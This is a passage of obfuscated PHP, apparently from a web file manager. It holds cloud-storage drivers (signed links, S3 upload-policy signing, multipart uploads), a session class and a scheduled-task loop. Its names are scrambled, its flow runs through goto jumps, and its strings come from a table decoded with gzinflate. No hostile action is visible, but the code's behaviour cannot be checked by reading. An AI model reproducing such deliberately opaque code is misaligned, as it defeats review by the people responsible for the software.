fwrite($Bêë’ôô, $c˜ğº®¶£Ô); $c¥Ä™«ˆ += $d±ÉÑâ°º¹; if (strlen($c˜ğº®¶£Ô) < $d±ÉÑâ°º¹) { break; } } goto cÊ­‡…Ú½ˆ; a›¦…™¿ò­: $Bâ’êø‚œ = IO::getPathInner(IO::mkfile($ağöÈ¨µ§ë)); if (!($BØ¶ĞÇÅªÈ = $this->link($d ¡„‚¢¸õ))) { return !1; } $c¥Ä™«ˆ = 0; goto EÜŒğÉœøä; cÊ­‡…Ú½ˆ: fclose($Bêë’ôô); return $ağöÈ¨µ§ë; goto D¯—§Ë‰ºÎ; D¯—§Ë‰ºÎ: } public function link($DîÈ’íÂŒ, $BŒÅÎó¯ = '') { if (!$this->isFile($DîÈ’íÂŒ)) { return !1; } $Aæ‡ŒèØö´ = $this->getHost() . $_SERVER[Ôğ—¤Šµˆ˜ñ£][8] . $this->pathEncode($DîÈ’íÂŒ) . $BŒÅÎó¯; return $this->auth->privateDownloadUrl($Aæ‡ŒèØö´, 3600 * 12); } public function fileOut($aùõ¢ï´…ª, $e‚ŸØİåö” = false, $FìÄ“ –â = false, $Eêïï¨ÀÏ = '') { $e…ˆ”‡à‚³ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if ($this->isFileOutServer()) { return $this->fileOutServer($aùõ¢ï´…ª, $e‚ŸØİåö”, $FìÄ“ –â, $Eêïï¨ÀÏ); } if (!$FìÄ“ –â) { $FìÄ“ –â = $this->pathThis($aùõ¢ï´…ª); } $eòïñÀ¶öã = $e‚ŸØİåö” ? $e…ˆ”‡à‚³[1336] . rawurlencode($FìÄ“ –â) : $e…ˆ”‡à‚³[33]; $a¯í‡øÔà³ = $this->link($aùõ¢ï´…ª, $eòïñÀ¶öã); $this->fileOutLink($a¯í‡øÔà³); } public function fileOutServer($Dë¤­ÙßÉÁ, $aòØĞÅâÖ¡ = false, $EèÂè¢ = false, $a‡†Ğé¶¥’ = '') { parent::fileOut($Dë¤­ÙßÉÁ, $aòØĞÅâÖ¡, $EèÂè¢, $a‡†Ğé¶¥’); } public function fileOutImage($aéš¨‰È³Ú, $f¾Ÿ¸¶°ä¢ = 250) { $fùè—Í’ = $this->link($aéš¨‰È³Ú, $_SERVER[Ôğ—¤Šµˆ˜ñ£][1337] . $f¾Ÿ¸¶°ä¢); $this->fileOutLink($fùè—Í’); } public function fileOutImageServer($aŠØ¨ˆ•È‚, $e‡µ ê‰øÌ = 250) { parent::fileOutImage($aŠØ¨ˆ•È‚, $e‡µ ê‰øÌ); } public function hashMd5($BÆ§«†İ–) { $A’Í¼ áñ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $F‰³¾µÅ×— = $this->objectMeta($BÆ§«†İ–); return isset($F‰³¾µÅ×—[$A’Í¼ áñ[208]]) ? $F‰³¾µÅ×—[$A’Í¼ áñ[208]] : !1; $FÛëæ‡ê = $this->link($BÆ§«†İ–, $A’Í¼ áñ[1338]); } public function size($d‰Ë”Ë ¿) { $Bë„ãøÂÕ = $this->objectMeta($d‰Ë”Ë ¿); return $Bë„ãøÂÕ ? $Bë„ãøÂÕ[$_SERVER[Ôğ—¤Šµˆ˜ñ£][78]] : 0; } public function info($A’½†‚ãì„) { if ($this->isFolder($A’½†‚ãì„)) { return $this->folderInfo($A’½†‚ãì„); } else { if ($this->isFile($A’½†‚ãì„)) { return $this->fileInfo($A’½†‚ãì„); } } return !1; } public function exist($fÖëøƒ¶) { return $this->isFile($fÖëøƒ¶) || $this->isFolder($fÖëøƒ¶); } public function isFile($d¦šˆãˆ›ã) { return !$this->isFolder($d¦šˆãˆ›ã) && $this->objectMeta($d¦šˆãˆ›ã); } public function isFolder($cë’‹Œ›½´) { return $this->cacheMethod($_SERVER[Ôğ—¤Šµˆ˜ñ£][199], $cë’‹Œ›½´); } protected function objectMeta($Cª§ÔÚâ) { return $this->cacheMethod($_SERVER[Ôğ—¤Šµˆ˜ñ£][200], $Cª§ÔÚâ); } protected function _objectMeta($E×§ë½Š) { $Fƒ¨íŒ÷˜ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; list($A¢ÍÒåÙÕé, $cŞ¦„Úœ¸) = $this->bucketManager->stat($this->bucket, $E×§ë½Š); if ($A¢ÍÒåÙÕé) { $A¢ÍÒåÙÕé[$Fƒ¨íŒ÷˜[78]] = intval($A¢ÍÒåÙÕé[$Fƒ¨íŒ÷˜[1324]]); } return $A¢ÍÒåÙÕé; } protected function _isFolder($E›ßãùŒæ) { $E¹éµ¯–¸² =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if ($E›ßãùŒæ == $E¹éµ¯–¸²[33] || $E›ßãùŒæ == $E¹éµ¯–¸²[8]) { return !0; } list($AÁ¶ÔÀåÑ„, $eŞÑÑâóÍ) = $this->bucketManager->listFiles($this->bucket, trim($E›ßãùŒæ, $E¹éµ¯–¸²[8]) . $E¹éµ¯–¸²[8], $E¹éµ¯–¸²[33], 1, $E¹éµ¯–¸²[8]); return !empty($AÁ¶ÔÀåÑ„[$E¹éµ¯–¸²[1327]]) || !empty($AÁ¶ÔÀåÑ„[$E¹éµ¯–¸²[1328]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($Bóå–ÌÊ) { parent::__construct($Bóå–ÌÊ); } public function uploadFormData($Cè¬Û¡ï›, $D½Ï¶óíÆ = 3600) { goto F¨»‡ÍÇŠÒ; a£Åœš¿Ù¦: $fŒÑí‚åŠª = base64_encode(json_encode($f™øÎã¤)); $BºÅÀ‚Ô¨« = hash_hmac($aÇ§ÜÀŠ¯[1255], $bÉ·ßŠ—, $aÇ§ÜÀŠ¯[1256] . $this->secret, !0); $E¨ç½…µÊ¼ = hash_hmac($aÇ§ÜÀŠ¯[1255], $this->region, $BºÅÀ‚Ô¨«, !0); goto Eê¬„³³óÑ; Eê¬„³³óÑ: $eæƒ¿¬÷ÔŒ = hash_hmac($aÇ§ÜÀŠ¯[1255], $F²ÍçêÈ, $E¨ç½…µÊ¼, !0); $f…ìÔáĞƒŒ = hash_hmac($aÇ§ÜÀŠ¯[1255], $F¬•½¨à°Æ, $eæƒ¿¬÷ÔŒ, !0); $CÕ¡ÊË·Õ = hash_hmac($aÇ§ÜÀŠ¯[1255], $fŒÑí‚åŠª, $f…ìÔáĞƒŒ); goto béßéÈ½›Á; dËœŸùª´: $A«‰Éˆ…ˆ‡ = array($this->accessKey, $bÉ·ßŠ—, $this->region, $F²ÍçêÈ, $F¬•½¨à°Æ); $cÕÛòÔØïô = implode($aÇ§ÜÀŠ¯[8], $A«‰Éˆ…ˆ‡); $f™øÎã¤ = array($aÇ§ÜÀŠ¯[1212] => gmdate($aÇ§ÜÀŠ¯[1211], strtotime($aÇ§ÜÀŠ¯[1248])), $aÇ§ÜÀŠ¯[1213] => array(array($aÇ§ÜÀŠ¯[1215] => $this->bucket), array($aÇ§ÜÀŠ¯[1214] => $aàÑè‚¢ê´), array($aÇ§ÜÀŠ¯[1216], $aÇ§ÜÀŠ¯[1217], $aÇ§ÜÀŠ¯[33]), array($aÇ§ÜÀŠ¯[1216], $aÇ§ÜÀŠ¯[1249], $aÇ§ÜÀŠ¯[33]), array($aÇ§ÜÀŠ¯[1216], $aÇ§ÜÀŠ¯[1250], $aÇ§ÜÀŠ¯[33]), array($aÇ§ÜÀŠ¯[1218] => $BøÌÖÑ¢“…), array($aÇ§ÜÀŠ¯[1251] => $cÕÛòÔØïô), array($aÇ§ÜÀŠ¯[1252] => $a‰¹Ûëˆ¡×), array($aÇ§ÜÀŠ¯[1253] => $cº«ìŠÉÈÊ), array($aÇ§ÜÀŠ¯[1254] => $F§ö¨à¯–—))); goto a£Åœš¿Ù¦; béßéÈ½›Á: $aí¹óÚííË = array($aÇ§ÜÀŠ¯[211] => $aÇ§ÜÀŠ¯[33], $aÇ§ÜÀŠ¯[1257] => $aÇ§ÜÀŠ¯[33], $aÇ§ÜÀŠ¯[1214] => $aàÑè‚¢ê´, $aÇ§ÜÀŠ¯[1218] => $BøÌÖÑ¢“…, $aÇ§ÜÀŠ¯[1222] => $fŒÑí‚åŠª, $aÇ§ÜÀŠ¯[1258] => $cÕÛòÔØïô, $aÇ§ÜÀŠ¯[1259] => $a‰¹Ûëˆ¡×, $aÇ§ÜÀŠ¯[1260] => $cº«ìŠÉÈÊ, $aÇ§ÜÀŠ¯[1261] => $F§ö¨à¯–—, $aÇ§ÜÀŠ¯[1262] => $CÕ¡ÊË·Õ, $aÇ§ÜÀŠ¯[175] => $this->getHost()); return $aí¹óÚííË; goto b°”ŞÁ¦; FÑùµÂ Š: $F²ÍçêÈ = $aÇ§ÜÀŠ¯[59]; $cº«ìŠÉÈÊ = gmdate($aÇ§ÜÀŠ¯[1246]); $bÉ·ßŠ— = gmdate($aÇ§ÜÀŠ¯[732]); goto aÙã¬ëÜ‡; F¨»‡ÍÇŠÒ: $aÇ§ÜÀŠ¯ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $aàÑè‚¢ê´ = $aÇ§ÜÀŠ¯[192]; $a‰¹Ûëˆ¡× = $aÇ§ÜÀŠ¯[1245]; goto FÑùµÂ Š; aÙã¬ëÜ‡: $F¬•½¨à°Æ = $aÇ§ÜÀŠ¯[1247]; $F§ö¨à¯–— = $D½Ï¶óíÆ . $aÇ§ÜÀŠ¯[33]; $BøÌÖÑ¢“… = $aÇ§ÜÀŠ¯[1210]; goto dËœŸùª´; b°”ŞÁ¦: } public function multiUploadFormData($F¿‚ÆµíÍ³, $BŒ°»ÊÄµï = 3600) { $c¬Ë¨îì®İ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $d„Ò ÂÍì§ = gmdate($c¬Ë¨îì®İ[1339]); $cù²ì²ä«Â = array(); $CáÚè¡“·ø = $this->client->getUploadId($this->bucket, $F¿‚ÆµíÍ³, $cù²ì²ä«Â); if (!$CáÚè¡“·ø) { return !1; } return array($c¬Ë¨îì®İ[221] => $CáÚè¡“·ø, $c¬Ë¨îì®İ[175] => $this->getHost() . $c¬Ë¨îì®İ[8] . $this->pathEncode($F¿‚ÆµíÍ³), $c¬Ë¨îì®İ[222] => $d„Ò ÂÍì§, $c¬Ë¨îì®İ[93] => $F¿‚ÆµíÍ³); } public function multiUploadAuthData($C‚“«âğ , $E„ÉÅÜÇ“ = array()) { goto cÎË¨‹Ş…Š; Dš½ÖÀ¸Ğ: unset($E„ÉÅÜÇ“[$f¥˜ˆÖØ˜[93]]); if (isset($E„ÉÅÜÇ“[$f¥˜ˆÖØ˜[223]])) { return $this->listUploadParts($cß„‰å±½ù, $E„ÉÅÜÇ“); } $A‚Ò™„ùî… = array(); goto cÆï‰¸äİ; BÌŞ…×™¬: $D‚ğ·ƒİ¨¾ = $f¥˜ˆÖØ˜[226]; $C÷´´³ğ×§ = $f¥˜ˆÖØ˜[8] . $this->pathEncode($cß„‰å±½ù) . $C„Üì‹…»; $bª‹†™¥¡™ = $this->client->__getSignatureV4($A‚Ò™„ùî…, $aòƒ÷÷­Ûé, $D‚ğ·ƒİ¨¾, $C÷´´³ğ×§); goto EõÀ”í‰Äò; EõÀ”í‰Äò: if (strpos($C„Üì‹…», $f¥˜ˆÖØ˜[225]) === 0) { if (isset($A‚Ò™„ùî…[$f¥˜ˆÖØ˜[1341]])) { $F¸»Á”£Ù† = $A‚Ò™„ùî…[$f¥˜ˆÖØ˜[1341]]; } else { if (isset($bª‹†™¥¡™[$f¥˜ˆÖØ˜[1341]])) { $F¸»Á”£Ù† = $bª‹†™¥¡™[$f¥˜ˆÖØ˜[1341]]; } else { $F¸»Á”£Ù† = hash($f¥˜ˆÖØ˜[1255], $f¥˜ˆÖØ˜[33]); } } return array($f¥˜ˆÖØ˜[232] => $bª‹†™¥¡™[$f¥˜ˆÖØ˜[232]], $f¥˜ˆÖØ˜[1341] => $F¸»Á”£Ù†, $f¥˜ˆÖØ˜[222] => $bª‹†™¥¡™[$f¥˜ˆÖØ˜[1344]]); } return $bª‹†™¥¡™[$f¥˜ˆÖØ˜[232]]; goto AÙÕÀ‘“©á; cÎË¨‹Ş…Š: $f¥˜ˆÖØ˜ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $C„Üì‹…» = isset($E„ÉÅÜÇ“[$f¥˜ˆÖØ˜[168]]) ? $E„ÉÅÜÇ“[$f¥˜ˆÖØ˜[168]] : $f¥˜ˆÖØ˜[33]; $cß„‰å±½ù = $E„ÉÅÜÇ“[$f¥˜ˆÖØ˜[93]]; goto Dš½ÖÀ¸Ğ; cÆï‰¸äİ: if (isset($E„ÉÅÜÇ“[$f¥˜ˆÖØ˜[1340]])) { $A‚Ò™„ùî…[$f¥˜ˆÖØ˜[1341]] = $E„ÉÅÜÇ“[$f¥˜ˆÖØ˜[1340]]; } $dã–¦Ä´Ÿß = explode($f¥˜ˆÖØ˜[177], $this->getHost()); $aòƒ÷÷­Ûé = array($f¥˜ˆÖØ˜[1342] => $dã–¦Ä´Ÿß[1], $f¥˜ˆÖØ˜[1343] => $f¥˜ˆÖØ˜[33], $f¥˜ˆÖØ˜[211] => $f¥˜ˆÖØ˜[119], $f¥˜ˆÖØ˜[1257] => $E„ÉÅÜÇ“[$f¥˜ˆÖØ˜[78]]); goto BÌŞ…×™¬; AÙÕÀ‘“©á: } public function listUploadParts($A¼ï¨‹†£Ô, $D¹•Á…„Ç = array()) { goto cÀÀƒÜ‘Ñ; B‰öÅ¾„ª: $a›İËó²ÄÌ = $this->client->__getSignatureV4($eº›òñ†¦Ñ, $aÜäô…¹˜, $Cöƒ³–ÄÏ‰, $F¶¯İˆˆ¨, $dùà˜––ƒä); return array($fí¹œ™¢‘Ó[232] => $a›İËó²ÄÌ[$fí¹œ™¢‘Ó[232]], $fí¹œ™¢‘Ó[222] => $a›İËó²ÄÌ[$fí¹œ™¢‘Ó[1344]], $fí¹œ™¢‘Ó[234] => $aòÜä‹‡, $fí¹œ™¢‘Ó[1341] => $a›İËó²ÄÌ[$fí¹œ™¢‘Ó[1341]]); goto FßºÆ‡‹‘±; dÄ†£„ËÅ‘: $dùà˜––ƒä .= $fí¹œ™¢‘Ó[1348]; $eº›òñ†¦Ñ = array(); $FÊ¤¸“°Œ½ = explode($fí¹œ™¢‘Ó[177], $this->getHost()); goto Cá¨²î‰êã; cÀÀƒÜ‘Ñ: $fí¹œ™¢‘Ó =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $BîŒä ¹·¿ = str_replace($fí¹œ™¢‘Ó[233], $fí¹œ™¢‘Ó[33], $D¹•Á…„Ç[$fí¹œ™¢‘Ó[168]]); $aòÜä‹‡ = $this->client->listParts($this->bucket, $A¼ï¨‹†£Ô, $BîŒä ¹·¿); goto CÕÛˆ½­ÙÀ; CÕÛˆ½­ÙÀ: if (!$aòÜä‹‡) { return !1; } $dùà˜––ƒä = $fí¹œ™¢‘Ó[1345]; foreach ($aòÜä‹‡ as $FâÃÀÄ¶¬Á) { $dùà˜––ƒä .= $fí¹œ™¢‘Ó[1346] . "\74\120\x61\162\164\116\x75\x6d\142\145\x72\76{$FâÃÀÄ¶¬Á[$fí¹œ™¢‘Ó[1302]]}\74\x2f\120\141\162\164\x4e\x75\x6d\x62\x65\162\x3e\xa" . "\x3c\x45\x54\x61\x67\76{$FâÃÀÄ¶¬Á[$fí¹œ™¢‘Ó[1303]]}\74\57\105\124\x61\147\x3e\12" . $fí¹œ™¢‘Ó[1347]; } goto dÄ†£„ËÅ‘; Cá¨²î‰êã: $aÜäô…¹˜ = array($fí¹œ™¢‘Ó[1342] => $FÊ¤¸“°Œ½[1], $fí¹œ™¢‘Ó[211] => $fí¹œ™¢‘Ó[119], $fí¹œ™¢‘Ó[1257] => strlen($dùà˜––ƒä)); $Cöƒ³–ÄÏ‰ = $fí¹œ™¢‘Ó[224]; $F¶¯İˆˆ¨ = $fí¹œ™¢‘Ó[8] . $this->pathEncode($A¼ï¨‹†£Ô) . $D¹•Á…„Ç[$fí¹œ™¢‘Ó[168]]; goto B‰öÅ¾„ª; FßºÆ‡‹‘±: } public function link($EåäæĞí¸ˆ, $EÄ²«îİÒİ = array()) { return parent::link($EåäæĞí¸ˆ, $EÄ²«îİÒİ); } public function fileOut($Cà™íÓ¨ñÊ, $c·ÆÍÂ±š‰ = false, $E¶Ó‰ÎèÙ‹ = false, $Fé§‡›ˆ¬ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[Ôğ—¤Šµˆ˜ñ£][1349])) { return parent::fileOutServer($Cà™íÓ¨ñÊ, $c·ÆÍÂ±š‰, $E¶Ó‰ÎèÙ‹, $Fé§‡›ˆ¬); } parent::fileOut($Cà™íÓ¨ñÊ, $c·ÆÍÂ±š‰, $E¶Ó‰ÎèÙ‹, $Fé§‡›ˆ¬); } public function fileOutImage($BœŠø‚Ù¾Ô, $fß™ÅŠ’Ø = 250) { if (strstr($this->endpoint, $_SERVER[Ôğ—¤Šµˆ˜ñ£][1349])) { return parent::fileOutImageServer($BœŠø‚Ù¾Ô, $fß™ÅŠ’Ø); } parent::fileOutImage($BœŠø‚Ù¾Ô, $fß™ÅŠ’Ø); } public function fileOutLink($eØï³‘’¦”) { $eÆ“Áš–çÊ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (substr($eØï³‘’¦”, 0, 7) == $eÆ“Áš–çÊ[1225]) { $eØï³‘’¦” = $eÆ“Áš–çÊ[1226] . substr($eØï³‘’¦”, 7); } header($eÆ“Áš–çÊ[159] . $eØï³‘’¦”); die; } public function getHost() { $Dù¯ˆÑ¶à =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $D‰»…‚ƒ–¸ = str_rtrim(parent::getHost(), $Dù¯ˆÑ¶à[8] . $this->bucket); $D‰»…‚ƒ–¸ = explode($Dù¯ˆÑ¶à[177], $D‰»…‚ƒ–¸); return $D‰»…‚ƒ–¸[0] . $Dù¯ˆÑ¶à[177] . $this->bucket . $Dù¯ˆÑ¶à[95] . $D‰»…‚ƒ–¸[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($Eáâ¦éÖ×¤, $E×¯Ó½’âÕ = 0) { parent::__construct(); $this->source = $Eáâ¦éÖ×¤; $this->sourceSize = $E×¯Ó½’âÕ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($A°‹ˆ–×Ö = false) { return $this->sourceSize; } public function getContent($cî‹ğ¨°šŠ = false) { return $this->fileSubstr($cî‹ğ¨°šŠ, 0, $this->sourceSize); } public function fileSubstr($C±‘ÔÁŞÅ’ = false, $F›•Ğ·íë = 0, $AÍÍÜÛİ = 0) { if (!$AÍÍÜÛİ) { $AÍÍÜÛİ = $this->sourceSize; } $Dñ„†È´¼“ = $this->sourceSize - $F›•Ğ·íë; if ($AÍÍÜÛİ >= $Dñ„†È´¼“) { $AÍÍÜÛİ = $Dñ„†È´¼“; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $F›•Ğ·íë, $AÍÍÜÛİ); } if ($this->sourceType == self::TYPE_FILE) { if ($AÍÍÜÛİ <= 0) { return $_SERVER[Ôğ—¤Šµˆ˜ñ£][33]; } $c»Ôæî¾‹¾ = ftell($this->source); fseek_64($this->source, $c»Ôæî¾‹¾ + $F›•Ğ·íë); $CÊ‘ëº‡ = @fread($this->source, $AÍÍÜÛİ); fseek_64($this->source, $c»Ôæî¾‹¾); return $CÊ‘ëº‡; } } public function hashMd5($bãÙëÏŞÏ = false) { return md5($this->getContent()); } public static function hash($E¤¢©Çæ×Š, $fÉ–Úòó¦Ë = 0) { $BäÓÛóÎä† = new PathDriverStream($E¤¢©Çæ×Š, $fÉ–Úòó¦Ë); return $BäÓÛóÎä†->hashSimple($E¤¢©Çæ×Š); } public static function md5($AÁ¦Ÿ¤Áè, $cò½ùÒ²Ç = 0) { $Bƒ¦Å‘ÙêÓ = new PathDriverStream($AÁ¦Ÿ¤Áè, $cò½ùÒ²Ç); return $Bƒ¦Å‘ÙêÓ->hashMd5($AÁ¦Ÿ¤Áè); } } goto e»×¤ğ…®; cáÄ±¶ô÷: define($_SERVER[Ôğ—¤Šµˆ˜ñ£][0], $_SERVER[Ôğ—¤Šµˆ˜ñ£][1]); $_SERVER[‡ÃŞ­‘Ï] = explode($_SERVER[Ôğ—¤Šµˆ˜ñ£][2], gzinflate(substr($_SERVER[Ôğ—¤Šµˆ˜ñ£][3], 10, -8))); function binCheckEq($c ¦÷‚§æ, $E˜ç”ĞŒ™…) { return $c ¦÷‚§æ == $E˜ç”ĞŒ™…; } goto bÇî¬–²¾; a’ã·ªºœ¥: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto F®¥ŞÁ·«¹; b´«¦‹”¤: $CÕÎÛÅÉÕÉ = $GLOBALS[$e”†×«‚Ã[6]][$e”†×«‚Ã[347]]; self::$sessionTime = $CÕÎÛÅÉÕÉ[$e”†×«‚Ã[1509]]; $EÂ•Ûë‚„È = isset($GLOBALS[$e”†×«‚Ã[1510]]) ? $GLOBALS[$e”†×«‚Ã[1510]] : SESSION_ID; goto d÷±¡©Ö†•; F®¥ŞÁ·«¹: $e”†×«‚Ã =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; static $e—­Í¯ÁÚ† = false; if ($e—­Í¯ÁÚ†) { return $e—­Í¯ÁÚ†; } goto b´«¦‹”¤; B¯¸Ò¾®Š: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $e—­Í¯ÁÚ† = new self(); return $e—­Í¯ÁÚ†; goto B¨âŸ Ÿ; A«ê¬…÷¹ø: $Aåà¯³ºéá = $CÕÎÛÅÉÕÉ[$f¿­³åÈã]; $e›‚š…òå = $CÕÎÛÅÉÕÉ[$e”†×«‚Ã[816]]; switch ($f¿­³åÈã) { case $e”†×«‚Ã[17]: self::$handle = Model($e”†×«‚Ã[817]); break; case $e”†×«‚Ã[818]: self::$handle = new CacheRedis($Aåà¯³ºéá, $e›‚š…òå); break; case $e”†×«‚Ã[819]: self::$handle = new CacheMemcached($Aåà¯³ºéá, $e›‚š…òå); break; case $e”†×«‚Ã[193]: $Aåà¯³ºéá[$e”†×«‚Ã[76]] = $Aåà¯³ºéá[$e”†×«‚Ã[76]] . $e”†×«‚Ã[1512]; self::$handle = new CacheFile($Aåà¯³ºéá, $e›‚š…òå); default: break; } goto B¯¸Ò¾®Š; d÷±¡©Ö†•: if (self::$sessionSign) { } else { if (Cookie::get($EÂ•Ûë‚„È)) { self::$sessionSign = Cookie::get($EÂ•Ûë‚„È); } else { self::$sessionSign = guid(); } } Cookie::setSafe($EÂ•Ûë‚„È, self::$sessionSign, self::$sessionTime); $f¿­³åÈã = $CÕÎÛÅÉÕÉ[$e”†×«‚Ã[1511]]; goto A«ê¬…÷¹ø; B¨âŸ Ÿ: } public static function sign($f“•²°˜ = false) { $f“•²°˜ && (self::$sessionSign = $f“•²°˜); self::init(); return self::$sessionSign; } public static function set($FÉ˜œˆÒ™©, $c‚Õƒ™²®´ = false) { self::init(); if (is_array($FÉ˜œˆÒ™©)) { foreach ($FÉ˜œˆÒ™© as $bÚæ èÜè => $C…š­’»Æ) { array_set_value(self::$data, $bÚæ èÜè, $C…š­’»Æ); } } else { array_set_value(self::$data, $FÉ˜œˆÒ™©, $c‚Õƒ™²®´); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($DÆäêèùµŸ = false) { self::init(); if (!$DÆäêèùµŸ) { return self::$data; } return array_get_value(self::$data, $DÆäêèùµŸ); } public static function remove($fÓó¡ÀÆä®) { self::init(); unset(self::$data[$fÓó¡ÀÆä®]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[Ôğ—¤Šµˆ˜ñ£][821])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { goto F‘©–ƒïˆ£; AÉ”‹ŒÈÌ‹: while (!0) { self::cacheClear(); if (self::valueGet($aË±„à«”†[731]) != $aË±„à«”†[87]) { self::valueSet($aË±„à«”†[1513], $aË±„à«”†[191]); self::log($aË±„à«”†[1517]); die; } self::valueSet($aË±„à«”†[1513], $aË±„à«”†[87]); self::valueSet($aË±„à«”†[1514], time()); self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } goto F±¢ñ×—˜í; BÈµ“³ù¿µ: http_close(); self::valueSet($aË±„à«”†[1513], $aË±„à«”†[87]); Hook::bind($aË±„à«”†[1515], $aË±„à«”†[1516]); goto AÉ”‹ŒÈÌ‹; F‘©–ƒïˆ£: $aË±„à«”† =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (self::valueGet($aË±„à«”†[731]) != $aË±„à«”†[87]) { return; } if (self::valueGet($aË±„à«”†[1513]) == $aË±„à«”†[87]) { $bîÉ™Œ‡ãŠ = self::valueGet($aË±„à«”†[1514]); if (time() - $bîÉ™Œ‡ãŠ > self::AUTO_RESTART_TIME) { self::restart(); } return; } goto BÈµ“³ù¿µ; F±¢ñ×—˜í: } public static function restart() { $bè©ÍÜ„ñ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; http_close(); self::valueSet($bè©ÍÜ„ñ[731], $bè©ÍÜ„ñ[191]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet($bè©ÍÜ„ñ[1513], $bè©ÍÜ„ñ[191]); self::valueSet($bè©ÍÜ„ñ[731], $bè©ÍÜ„ñ[87]); } public static function shutdownEvent() { $eš˜®„Áó« =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; self::valueSet($eš˜®„Áó«[1513], $eš˜®„Áó«[191]); self::log($eš˜®„Áó«[1518]); } public static function config($DÓØˆ»ä˜¹, $dƒåñ™ÍÉÎ) { self::valueSet($_SERVER[Ôğ—¤Šµˆ˜ñ£][731], $DÓØˆ»ä˜¹); } private static function taskRunAll() { goto cÇÖùÈ£ÎÑ; cÇÖùÈ£ÎÑ: $c°•¾İÈµê =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $dò¯¬¹ïÀğ = timeFloat(); $c½Ü‹ĞˆŞ = Model($c°•¾İÈµê[1519])->listData(); goto eÊÅÇ‡º”È; cí³ÚåçÚİ: self::taskQueueRun($dò¯¬¹ïÀğ); goto fÁªŒß›¬Œ; eÊÅÇ‡º”È: $EÏœÅ‡¸ƒ¤ = count($c½Ü‹ĞˆŞ); for ($FÍİ‰º°ğõ = 0; $FÍİ‰º°ğõ < $EÏœÅ‡¸ƒ¤; $FÍİ‰º°ğõ++) { $fÄŒ³ª”ï = $c½Ü‹ĞˆŞ[$FÍİ‰º°ğõ]; if (!$fÄŒ³ª”ï[$c°•¾İÈµê[395]] || $fÄŒ³ª”ï[$c°•¾İÈµê[1520]] != $c°•¾İÈµê[87]) { continue; } if (!self::taskTimeCheck($fÄŒ³ª”ï)) { continue; } self::taskRun($fÄŒ³ª”ï); } Hook::trigger($c°•¾İÈµê[1521]); goto cí³ÚåçÚİ; fÁªŒß›¬Œ: } private static function taskQueueRun($eÄ©®¥Ç¾Ğ) { $BÎÀåï¸“ = 10; while (!0) { $bô×¶‡¹›½ = TaskQueue::run(); if ($bô×¶‡¹›½ === !1) { break; } if (timeFloat() - $eÄ©®¥Ç¾Ğ >= $BÎÀåï¸“) { break; } } } private static function taskTimeCheck($C°ŒÌğ Â) { goto b‡ŒßÜ¯Áï; d„ëÃÄšõğ: $e¥õÚò´Œ“ = strtotime($fÊœ›ÌÊ¨²[1522] . $fèÓİ¸«Ê[$fÊœ›ÌÊ¨²[1523]] . $fÊœ›ÌÊ¨²[1524]) - strtotime($fÊœ›ÌÊ¨²[1525]); $E¿çªÒøˆ… = time() - strtotime(date($fÊœ›ÌÊ¨²[1526]) . $fÊœ›ÌÊ¨²[1527]); $c›âñ¾Ş¤¾ = $E¿çªÒøˆ… >= $e¥õÚò´Œ“ && $E¿çªÒøˆ… <= $e¥õÚò´Œ“ + 3600; goto Aäœ…ËÂÑ‘; b‡ŒßÜ¯Áï: $fÊœ›ÌÊ¨² =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $fèÓİ¸«Ê = json_decode($C°ŒÌğ Â[$fÊœ›ÌÊ¨²[197]], !0); $b¶ãİ±ëë = intval($C°ŒÌğ Â[$fÊœ›ÌÊ¨²[1514]]); goto d„ëÃÄšõğ; Aäœ…ËÂÑ‘: switch ($fèÓİ¸«Ê[$fÊœ›ÌÊ¨²[29]]) { case $fÊœ›ÌÊ¨²[1528]: if (time() - $b¶ãİ±ëë < 3600 * 24 * 30) { return !1; } if ($fèÓİ¸«Ê[$fÊœ›ÌÊ¨²[1528]] == date($fÊœ›ÌÊ¨²[1529]) && $c›âñ¾Ş¤¾) { return !0; } break; case $fÊœ›ÌÊ¨²[1530]: if (time() - $b¶ãİ±ëë < 3600 * 24 * 7) { return !1; } $DêĞ…ÆÂéñ = date($fÊœ›ÌÊ¨²[1531]) == 0 ? 7 : date($fÊœ›ÌÊ¨²[1531]); if ($fèÓİ¸«Ê[$fÊœ›ÌÊ¨²[1530]] == $DêĞ…ÆÂéñ && $c›âñ¾Ş¤¾) { return !0; } break; case $fÊœ›ÌÊ¨²[1523]: if (time() - 